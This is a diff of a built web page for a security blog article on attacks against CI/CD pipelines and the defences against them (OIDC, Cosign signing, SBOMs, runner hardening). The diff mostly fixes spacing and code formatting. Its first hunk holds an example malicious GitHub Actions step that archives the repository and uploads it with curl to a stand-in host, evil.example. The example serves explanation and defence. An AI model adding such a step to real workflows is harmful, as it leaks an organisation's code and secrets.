@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -68,14 +68,14 @@
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="a-workflow--pipeline-injection-eg-github-actions-gitlab-ci">A. Workflow / pipeline injection (e.g., GitHub Actions, GitLab CI)<a href="#a-workflow--pipeline-injection-eg-github-actions-gitlab-ci" class="hash-link" aria-label="Direct link to A. Workflow / pipeline injection (e.g., GitHub Actions, GitLab CI)" title="Direct link to A. Workflow / pipeline injection (e.g., GitHub Actions, GitLab CI)" translate="no">​</a></h3>
 <p><strong>What</strong>: An attacker submits a PR or compromises a dev account to change a workflow that runs arbitrary commands during CI.</p>
 <p><strong>Example (malicious GitHub Action step)</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># .github/workflows/ci.yml</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">jobs:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">build:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">runs-on:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ubuntu-latest</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">steps:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">      </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">uses:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">actions/checkout@v4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">      </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">name:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Build</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">exfiltrate</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secrets</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">run:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">|</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">          tar -czf /tmp/code.tgz .</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">          curl -X POST https://evil.example/upload -F file=@/tmp/code.tgz</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># .github/workflows/ci.yml</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">jobs:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  build:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    runs-on: ubuntu-latest</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    steps:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">      - uses: actions/checkout@v4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">      - name: Build and exfiltrate secrets</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        run: |</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">          tar -czf /tmp/code.tgz .</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">          curl -X POST https://evil.example/upload -F file=@/tmp/code.tgz</span><br></div></code></pre></div></div>
 <p><strong>Why it works</strong>: Many repos auto-run workflows on PRs or merges; a workflow runs with permissions of the runner and may have access to secrets.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="b-dependencyregistry-poisoning-typosquatting-dependency-confusion">B. Dependency/registry poisoning (typosquatting, dependency confusion)<a href="#b-dependencyregistry-poisoning-typosquatting-dependency-confusion" class="hash-link" aria-label="Direct link to B. Dependency/registry poisoning (typosquatting, dependency confusion)" title="Direct link to B. Dependency/registry poisoning (typosquatting, dependency confusion)" translate="no">​</a></h3>
 <p><strong>What</strong>: Publish a malicious package (PyPI, npm) with a name similar to an internal package or exploit misconfigured private/public precedence.</p>
 <p><strong>Tools / Mitigations</strong>:</p>
 <ul>
 <li class="">
-<p>Use<strong>SBOM</strong>tooling (Syft) and vulnerability scanning (Grype/Trivy).</p>
+<p>Use <strong>SBOM</strong> tooling (Syft) and vulnerability scanning (Grype/Trivy).</p>
 </li>
 <li class="">
 <p>Enforce private registry usage and prevent accidental fallback to the public registry.</p>
@@ -86,33 +86,33 @@
 <p><strong>Detection &amp; tools</strong>:</p>
 <ul>
 <li class="">
-<p><strong>Gitleaks</strong>,<strong>truffleHog</strong>to scan repo history and PRs.</p>
+<p><strong>Gitleaks</strong>, <strong>truffleHog</strong> to scan repo history and PRs.</p>
 </li>
 <li class="">
-<p>GitHub<strong>secret scanning</strong>, GitLab secret detection, or<strong>Snyk Code</strong>.</p>
+<p>GitHub <strong>secret scanning</strong>, GitLab secret detection, or <strong>Snyk Code</strong>.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="d-build-agent-takeover-docker-socket-vulnerable-base-images">D. Build agent takeover (docker socket, vulnerable base images)<a href="#d-build-agent-takeover-docker-socket-vulnerable-base-images" class="hash-link" aria-label="Direct link to D. Build agent takeover (docker socket, vulnerable base images)" title="Direct link to D. Build agent takeover (docker socket, vulnerable base images)" translate="no">​</a></h3>
 <p><strong>What</strong>: Runners with Docker socket mounted or stale images allow attackers to break out, steal host credentials, or pivot.</p>
 <p><strong>Examples of bad practice</strong>:</p>
 <ul>
-<li class="">Self-hosted runner with<code>/var/run/docker.sock</code>mounted and cached credentials in<code>/root/.aws/credentials</code>.</li>
+<li class="">Self-hosted runner with <code>/var/run/docker.sock</code> mounted and cached credentials in <code>/root/.aws/credentials</code>.</li>
 </ul>
 <p><strong>Mitigations</strong>:</p>
 <ul>
 <li class="">
-<p>Avoid mounting host Docker socket — use<strong>Kaniko</strong>,<strong>buildah</strong>, or<strong>kaniko-in-cluster</strong>for container builds.</p>
+<p>Avoid mounting host Docker socket — use <strong>Kaniko</strong>, <strong>buildah</strong>, or <strong>kaniko-in-cluster</strong> for container builds.</p>
 </li>
 <li class="">
 <p>Use ephemeral runners (Kubernetes pods) and redeploy them cleanly per job.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="e-artifact-repository-compromise-nexus-artifactory-github-packages">E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)<a href="#e-artifact-repository-compromise-nexus-artifactory-github-packages" class="hash-link" aria-label="Direct link to E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)" title="Direct link to E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)" translate="no">​</a></h3>
-<p><strong>What</strong>: Replace artifacts or publish tampered images with a<code>latest</code>tag that pipelines pull.</p>
+<p><strong>What</strong>: Replace artifacts or publish tampered images with a <code>latest</code> tag that pipelines pull.</p>
 <p><strong>Mitigations</strong>:</p>
 <ul>
 <li class="">
-<p>Sign artifacts with<strong>Sigstore / Cosign</strong>and validate signatures in deploy pipelines.</p>
+<p>Sign artifacts with <strong>Sigstore / Cosign</strong> and validate signatures in deploy pipelines.</p>
 </li>
 <li class="">
 <p>Lock immutability policies on registries (immutable tags).</p>
@@ -130,13 +130,13 @@
 <p><code>permissions: id-token: write contents: read jobs: deploy: runs-on: ubuntu-latest steps: - name: Configure AWS credentials uses: aws-actions/configure-aws-credentials@v2 with: role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole aws-region: us-east-1</code></p>
 </li>
 <li class="">
-<p><strong>HashiCorp Vault</strong>with dynamic secrets: issue DB and cloud creds on demand; rotate automatically.</p>
+<p><strong>HashiCorp Vault</strong> with dynamic secrets: issue DB and cloud creds on demand; rotate automatically.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="secrets-management">Secrets management<a href="#secrets-management" class="hash-link" aria-label="Direct link to Secrets management" title="Direct link to Secrets management" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>Centralize secrets:<strong>Vault</strong>,<strong>AWS Secrets Manager</strong>,<strong>Azure Key Vault</strong>, or<strong>GCP Secret Manager</strong>.</p>
+<p>Centralize secrets: <strong>Vault</strong>, <strong>AWS Secrets Manager</strong>, <strong>Azure Key Vault</strong>, or <strong>GCP Secret Manager</strong>.</p>
 </li>
 <li class="">
 <p>Inject secrets at runtime via vault agents or environment-providers (not via plain env vars checked into code).</p>
@@ -148,7 +148,7 @@
 <p><strong>Sigstore / Cosign + Rekor</strong>: sign container images and verify signatures during deployment.</p>
 </li>
 <li class="">
-<p>Generate<strong>SBOMs</strong>with<strong>Syft</strong>and scan with<strong>Grype</strong>/<strong>Trivy</strong>during CI.</p>
+<p>Generate <strong>SBOMs</strong> with <strong>Syft</strong> and scan with <strong>Grype</strong> / <strong>Trivy</strong> during CI.</p>
 </li>
 <li class="">
 <p>Example: Sign image after build:</p>
@@ -160,16 +160,16 @@
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pipeline-hardening--policy">Pipeline hardening &amp; policy<a href="#pipeline-hardening--policy" class="hash-link" aria-label="Direct link to Pipeline hardening &amp; policy" title="Direct link to Pipeline hardening &amp; policy" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>Treat pipeline definitions as code: require<strong>PR review</strong>and branch protection on<code>.github/workflows/*</code>.</p>
+<p>Treat pipeline definitions as code: require <strong>PR review</strong> and branch protection on <code>.github/workflows/*</code>.</p>
 </li>
 <li class="">
-<p>Use<strong>policy-as-code</strong>:</p>
+<p>Use <strong>policy-as-code</strong>:</p>
 </li>
 <li class="">
-<p><strong>Open Policy Agent (OPA)/Gatekeeper</strong>for Kubernetes admission controls.</p>
+<p><strong>Open Policy Agent (OPA)/Gatekeeper</strong> for Kubernetes admission controls.</p>
 </li>
 <li class="">
-<p><strong>Conftest</strong>,<strong>Terraform Sentinel</strong>, or<strong>OPA</strong>checks integrated in CI to block dangerous pipeline changes.</p>
+<p><strong>Conftest</strong>, <strong>Terraform Sentinel</strong>, or <strong>OPA</strong> checks integrated in CI to block dangerous pipeline changes.</p>
 </li>
 <li class="">
 <p>Enforce least privilege for runner tokens and repository permissions.</p>
@@ -178,37 +178,37 @@
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="static--dynamic-analysis-tooling">Static &amp; dynamic analysis (tooling)<a href="#static--dynamic-analysis-tooling" class="hash-link" aria-label="Direct link to Static &amp; dynamic analysis (tooling)" title="Direct link to Static &amp; dynamic analysis (tooling)" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>SAST / Secret Scanning</strong>: GitHub Advanced Security,<strong>Gitleaks</strong>,<strong>TruffleHog</strong>,<strong>Snyk</strong>,<strong>Checkmarx</strong>.</p>
+<p><strong>SAST / Secret Scanning</strong>: GitHub Advanced Security, <strong>Gitleaks</strong>, <strong>TruffleHog</strong>, <strong>Snyk</strong>, <strong>Checkmarx</strong>.</p>
 </li>
 <li class="">
-<p><strong>Container/Image scanning</strong>:<strong>Trivy</strong>,<strong>Clair</strong>,<strong>Anchore</strong>,<strong>Aqua</strong>.</p>
+<p><strong>Container/Image scanning</strong>: <strong>Trivy</strong>, <strong>Clair</strong>, <strong>Anchore</strong>, <strong>Aqua</strong>.</p>
 </li>
 <li class="">
-<p><strong>IaC scanning</strong>:<strong>Checkov</strong>,<strong>tfsec</strong>,<strong>terrascan</strong>.</p>
+<p><strong>IaC scanning</strong>: <strong>Checkov</strong>, <strong>tfsec</strong>, <strong>terrascan</strong>.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="protect-runners--build-hosts">Protect runners / build hosts<a href="#protect-runners--build-hosts" class="hash-link" aria-label="Direct link to Protect runners / build hosts" title="Direct link to Protect runners / build hosts" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>Use<strong>ephemeral runners</strong>: GitHub Actions self-hosted runners on Kubernetes using<strong>act-runner-controller</strong>or GitLab Kubernetes runners.</p>
+<p>Use <strong>ephemeral runners</strong>: GitHub Actions self-hosted runners on Kubernetes using <strong>act-runner-controller</strong> or GitLab Kubernetes runners.</p>
 </li>
 <li class="">
 <p>Restrict network egress for runners (deny-list external destinations) — allow only necessary registries and artifact stores.</p>
 </li>
 <li class="">
-<p>Run runners in<strong>isolated namespaces</strong>, no access to production secrets.</p>
+<p>Run runners in <strong>isolated namespaces</strong>, no access to production secrets.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="logging-detection--runtime-controls">Logging, detection &amp; runtime controls<a href="#logging-detection--runtime-controls" class="hash-link" aria-label="Direct link to Logging, detection &amp; runtime controls" title="Direct link to Logging, detection &amp; runtime controls" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>Ship CI logs to central observability:<strong>XPLG /ELK / Splunk</strong>. Correlate with identity logs.</p>
+<p>Ship CI logs to central observability: <strong>XPLG /ELK / Splunk</strong> . Correlate with identity logs.</p>
 </li>
 <li class="">
-<p>Use<strong>Falco</strong>to detect suspicious container activity on runner hosts (sudden outbound to unusual domains, process injection).</p>
+<p>Use <strong>Falco</strong> to detect suspicious container activity on runner hosts (sudden outbound to unusual domains, process injection).</p>
 </li>
 <li class="">
-<p>Add<strong>audit logging</strong>for artifact registries and cloud API calls.</p>
+<p>Add <strong>audit logging</strong> for artifact registries and cloud API calls.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-example-defenses-in-a-flow--an-end-to-end-sequence">4) Example defenses in a flow — an end-to-end sequence<a href="#4-example-defenses-in-a-flow--an-end-to-end-sequence" class="hash-link" aria-label="Direct link to 4) Example defenses in a flow — an end-to-end sequence" title="Direct link to 4) Example defenses in a flow — an end-to-end sequence" translate="no">​</a></h3>
@@ -217,7 +217,7 @@
 <p>Developer opens PR to change code or workflow.</p>
 </li>
 <li class="">
-<p><strong>Checks</strong>: PR trigger runs<strong>gitleaks</strong>,<strong>Conftest</strong>policy checks on workflow files.</p>
+<p><strong>Checks</strong>: PR trigger runs <strong>gitleaks</strong>, <strong>Conftest</strong> policy checks on workflow files.</p>
 </li>
 <li class="">
 <p>If workflow files changed, require manual approval from infra/security team (branch protection).</p>
@@ -228,13 +228,13 @@
 </ol>
 <ul>
 <li class="">
-<p>Runner fetches dynamic credentials via<strong>OIDC → AWS STS</strong>(no stored secrets).</p>
+<p>Runner fetches dynamic credentials via <strong>OIDC → AWS STS</strong> (no stored secrets).</p>
 </li>
 <li class="">
-<p>Container built using<strong>Kaniko</strong>, produces an SBOM (Syft) and scanned with<strong>Trivy</strong>.</p>
+<p>Container built using <strong>Kaniko</strong>, produces an SBOM (Syft) and scanned with <strong>Trivy</strong>.</p>
 </li>
 <li class="">
-<p>Image signed via<strong>Cosign</strong>and published to registry with immutability.</p>
+<p>Image signed via <strong>Cosign</strong> and published to registry with immutability.</p>
 </li>
 </ul>
 <ol start="3">
@@ -244,7 +244,7 @@
 <li class="">Any mismatch or vulnerability above threshold blocks deploy.</li>
 </ul>
 <ol start="4">
-<li class="">Monitoring: Falco + ELK alert on unusual outbound traffic or attempts to call<code>cosign verify</code>failures.</li>
+<li class="">Monitoring: Falco + ELK alert on unusual outbound traffic or attempts to call <code>cosign verify</code> failures.</li>
 </ol>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-detection--incident-response-playbook-outline">5) Detection &amp; incident response (playbook outline)<a href="#5-detection--incident-response-playbook-outline" class="hash-link" aria-label="Direct link to 5) Detection &amp; incident response (playbook outline)" title="Direct link to 5) Detection &amp; incident response (playbook outline)" translate="no">​</a></h3>
 <p><strong>Detect</strong></p>
@@ -256,7 +256,7 @@
 <p>Unexpected runner activity: large archive uploads, unknown outbound connections, process dumping.</p>
 </li>
 <li class="">
-<p>Registry events: unexpected uploads, re-tagging of<code>latest</code>.</p>
+<p>Registry events: unexpected uploads, re-tagging of <code>latest</code>.</p>
 </li>
 </ul>
 <p><strong>Contain</strong></p>
@@ -320,7 +320,7 @@
 <p>Use ephemeral runners in k8s — destroy and rebuild regularly.</p>
 </li>
 <li class="">
-<p>Block access to<code>/var/run/docker.sock</code>(use kaniko/buildah).</p>
+<p>Block access to <code>/var/run/docker.sock</code> (use kaniko/buildah).</p>
 </li>
 <li class="">
 <p>Centralize logs and create CI-specific detection rules (e.g., many outbound connections from runner).</p>
@@ -357,13 +357,13 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="8-example-enforce-oidc--cosign-verification-in-github-actions">8) Example: enforce OIDC + Cosign verification in GitHub Actions<a href="#8-example-enforce-oidc--cosign-verification-in-github-actions" class="hash-link" aria-label="Direct link to 8) Example: enforce OIDC + Cosign verification in GitHub Actions" title="Direct link to 8) Example: enforce OIDC + Cosign verification in GitHub Actions" translate="no">​</a></h3>
-<p><strong>1) Use OIDC to get AWS role</strong>(see snippet above).
+<p><strong>1) Use OIDC to get AWS role</strong> (see snippet above).
 <strong>2) Sign image with Cosign in the build job</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">- name: Sign image</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  run: |</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    cosign sign --key </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">${{ secrets.COSIGN_KEY }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">} ghcr.io/org/myimage:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">${{ github.sha }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">- name: Sign image</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  run: |</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    cosign sign --key ${{ secrets.COSIGN_KEY }} ghcr.io/org/myimage:${{ github.sha }}</span><br></div></code></pre></div></div>
 <p><strong>3) Verify signature in deploy job</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">- name: Verify signature</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  run: |</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    cosign verify --key cosign.pub ghcr.io/org/myimage:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">${{ github.sha }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">- name: Verify signature</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  run: |</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    cosign verify --key cosign.pub ghcr.io/org/myimage:${{ github.sha }}</span><br></div></code></pre></div></div>
 <p><em>(Prefer using a remote key management pattern with Cosign KMS integrations rather than storing private keys in repo secrets)</em></p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion--stop-thinking-of-cicd-as-less-important">Conclusion — stop thinking of CI/CD as “less important”<a href="#conclusion--stop-thinking-of-cicd-as-less-important" class="hash-link" aria-label="Direct link to Conclusion — stop thinking of CI/CD as “less important”" title="Direct link to Conclusion — stop thinking of CI/CD as “less important”" translate="no">​</a></h2>
-<p>CI/CD systems are no longer peripheral tooling — they are critical infrastructure. The modern attacker knows this and will target the weakest links: misconfigured runners, exposed secrets, unsigned artifacts, and lenient pipeline policies. Defend by combining<strong>least privilege</strong>,<strong>ephemeral infrastructure</strong>,<strong>supply-chain integrity (SBOM + signing)</strong>, and<strong>proactive detection</strong>.</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2025/2025-10-13-villager-the-ai-powered-penetration-testing-framework-8df10532e265"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Villager: The AI-Powered Penetration Testing Framework</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2025/2025-10-18-automating-a-safe-dvwa-lab-with-ansible-build-a-reproducible-vulnerable-environment-for-tr-026d74697c4a"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Automating a Safe DVWA Lab with Ansible: Build a Reproducible Vulnerable Environment for Training…</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#how-adversaries-weaponize-build-systems--and-the-concrete-tools--controls-you-can-use-to-stop-them" class="table-of-contents__link toc-highlight">How adversaries weaponize build systems — and the concrete tools &amp; controls you can use to stop them</a></li></ul></li><li><a href="#quick-roadmap" class="table-of-contents__link toc-highlight">Quick roadmap</a></li><li><a href="#1-why-cicd-is-so-valuable-to-attackers" class="table-of-contents__link toc-highlight">1) Why CI/CD is so valuable to attackers</a></li><li><a href="#2-attack-vectors--detailed-with-examples" class="table-of-contents__link toc-highlight">2) Attack vectors — detailed, with examples</a><ul><li><a href="#a-workflow--pipeline-injection-eg-github-actions-gitlab-ci" class="table-of-contents__link toc-highlight">A. Workflow / pipeline injection (e.g., GitHub Actions, GitLab CI)</a></li><li><a href="#b-dependencyregistry-poisoning-typosquatting-dependency-confusion" class="table-of-contents__link toc-highlight">B. Dependency/registry poisoning (typosquatting, dependency confusion)</a></li><li><a href="#c-secret-leakage-hardcoded-tokens--env-vars" class="table-of-contents__link toc-highlight">C. Secret leakage (hardcoded tokens / env vars)</a></li><li><a href="#d-build-agent-takeover-docker-socket-vulnerable-base-images" class="table-of-contents__link toc-highlight">D. Build agent takeover (docker socket, vulnerable base images)</a></li><li><a href="#e-artifact-repository-compromise-nexus-artifactory-github-packages" class="table-of-contents__link toc-highlight">E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)</a></li><li><a href="#3-defenses--concrete-tools-configs--examples" class="table-of-contents__link toc-highlight">3) Defenses — concrete tools, configs &amp; examples</a></li><li><a href="#identity--credentials-short-lived-auditable-tokens" class="table-of-contents__link toc-highlight">Identity &amp; credentials: short-lived, auditable tokens</a></li><li><a href="#secrets-management" class="table-of-contents__link toc-highlight">Secrets management</a></li><li><a href="#supply-chain-integrity" class="table-of-contents__link toc-highlight">Supply-chain integrity</a></li><li><a href="#pipeline-hardening--policy" class="table-of-contents__link toc-highlight">Pipeline hardening &amp; policy</a></li><li><a href="#static--dynamic-analysis-tooling" class="table-of-contents__link toc-highlight">Static &amp; dynamic analysis (tooling)</a></li><li><a href="#protect-runners--build-hosts" class="table-of-contents__link toc-highlight">Protect runners / build hosts</a></li><li><a href="#logging-detection--runtime-controls" class="table-of-contents__link toc-highlight">Logging, detection &amp; runtime controls</a></li><li><a href="#4-example-defenses-in-a-flow--an-end-to-end-sequence" class="table-of-contents__link toc-highlight">4) Example defenses in a flow — an end-to-end sequence</a></li><li><a href="#5-detection--incident-response-playbook-outline" class="table-of-contents__link toc-highlight">5) Detection &amp; incident response (playbook outline)</a></li><li><a href="#6-practical-checklist-apply-this-week" class="table-of-contents__link toc-highlight">6) Practical checklist (apply this week)</a></li><li><a href="#7-recommended-tool-stack-fast-reference" class="table-of-contents__link toc-highlight">7) Recommended tool stack (fast reference)</a></li><li><a href="#8-example-enforce-oidc--cosign-verification-in-github-actions" class="table-of-contents__link toc-highlight">8) Example: enforce OIDC + Cosign verification in GitHub Actions</a></li></ul></li><li><a href="#conclusion--stop-thinking-of-cicd-as-less-important" class="table-of-contents__link toc-highlight">Conclusion — stop thinking of CI/CD as “less important”</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
+<p>CI/CD systems are no longer peripheral tooling — they are critical infrastructure. The modern attacker knows this and will target the weakest links: misconfigured runners, exposed secrets, unsigned artifacts, and lenient pipeline policies. Defend by combining <strong>least privilege</strong>, <strong>ephemeral infrastructure</strong>, <strong>supply-chain integrity (SBOM + signing)</strong>, and <strong>proactive detection</strong>.</p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2025/2025-10-13-villager-the-ai-powered-penetration-testing-framework-8df10532e265"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Villager: The AI-Powered Penetration Testing Framework</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2025/2025-10-18-automating-a-safe-dvwa-lab-with-ansible-build-a-reproducible-vulnerable-environment-for-tr-026d74697c4a"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Automating a Safe DVWA Lab with Ansible: Build a Reproducible Vulnerable Environment for Training…</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#how-adversaries-weaponize-build-systems--and-the-concrete-tools--controls-you-can-use-to-stop-them" class="table-of-contents__link toc-highlight">How adversaries weaponize build systems — and the concrete tools &amp; controls you can use to stop them</a></li></ul></li><li><a href="#quick-roadmap" class="table-of-contents__link toc-highlight">Quick roadmap</a></li><li><a href="#1-why-cicd-is-so-valuable-to-attackers" class="table-of-contents__link toc-highlight">1) Why CI/CD is so valuable to attackers</a></li><li><a href="#2-attack-vectors--detailed-with-examples" class="table-of-contents__link toc-highlight">2) Attack vectors — detailed, with examples</a><ul><li><a href="#a-workflow--pipeline-injection-eg-github-actions-gitlab-ci" class="table-of-contents__link toc-highlight">A. Workflow / pipeline injection (e.g., GitHub Actions, GitLab CI)</a></li><li><a 